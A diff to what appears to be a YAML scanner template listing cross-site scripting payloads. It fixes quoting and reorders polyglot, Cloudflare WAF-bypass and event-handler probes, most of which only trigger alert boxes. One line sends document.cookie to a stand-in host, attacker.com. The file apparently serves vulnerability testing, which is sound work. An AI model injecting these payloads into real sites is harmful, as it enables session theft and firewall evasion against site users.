@@ -116,10 +116,9 @@ http:
         - '<script>fetch("http://attacker.com",{method:"POST",body:document.cookie})</script>'
 
         # Polyglot payloads
-        - 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'
-        - '" onclick=alert({{random}})//<button \' onclick=alert({{random}})//> */ alert({{random}})//'
-        - '-->\'"</sCript><svG x=">" onload=(co\u006efirm)``>'
+        - "-->'\"</sCript><svG x=\">\" onload=(co\u006efirm)``>"
         - '<svg%0Ao%00nload=%09((pro\u006dpt))({{random}})//>'
+        - '" onclick=alert({{random}})//<button onclick=alert({{random}})//> */ alert({{random}})//'
 
         # WAF Bypasses - Cloudflare
         - '<svg/onrandom=random onload=alert({{random}})>'
@@ -142,9 +141,9 @@ http:
 
         # Advanced bypasses
         - '<script x>alert({{random}})</script>'
-        - '<img src=\'1\' onerror=\'alert({{random}})\' <'
-        - '<a href="" onmousedown="var name = \'&#39;;alert({{random}})//\'; alert(\'x\')">Link</a>'
-        - '<script>window[\'alert\']({{random}})</script>'
+        - "<img src='1' onerror='alert({{random}})' <"
+        - '<a href="" onmousedown="var name = ''&#39;;alert({{random}})//''; alert(''x'')">Link</a>'
+        - "<script>window['alert']({{random}})</script>"
         - '<script>eval(atob("YWxlcnQoMSk="))</script>'
 
         # Space bypasses
@@ -159,7 +158,7 @@ http:
         - '<input type="hidden" oncontentvisibilityautostatechange="alert({{random}})" style="content-visibility:auto">'
 
         # JS context
-        - '-(confirm)({{random}})//';
+        - '-(confirm)({{random}})//'
         - '; alert({{random}});//'
 
     stop-at-first-match: true
